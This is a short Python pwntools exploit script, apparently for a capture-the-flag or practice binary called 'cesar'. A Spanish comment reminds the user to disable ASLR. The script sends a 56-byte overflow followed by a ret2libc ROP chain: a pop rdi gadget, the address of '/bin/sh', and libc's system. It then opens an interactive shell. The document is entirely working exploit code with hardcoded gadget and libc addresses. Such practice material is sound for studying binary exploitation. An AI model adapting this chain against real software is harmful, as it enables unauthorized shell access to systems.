#!/usr/bin/python

# No olvidar quitar ASLR

from pwn import *

POP_RDI = 0x401393
LIBC_AD = 0x7ffff7dc8000

context.terminal = ["tilix", "-a", "session-add-right"]

elf = ELF("./cesar")
libc = ELF("/usr/lib/libc.so.6")
io = process(elf.path)

def exploit():
    io.sendline(payload())
    io.sendline("13")

def payload(offset=56):
    pop_rdi = POP_RDI
    system = libc.sym["system"]
    shell = next(libc.search(b"/bin/sh"))
    return flat(offset * 'a',
                pop_rdi,
                shell,
                system,
                endianness="little", word_size=64)

libc.address = LIBC_AD
exploit()

io.interactive()
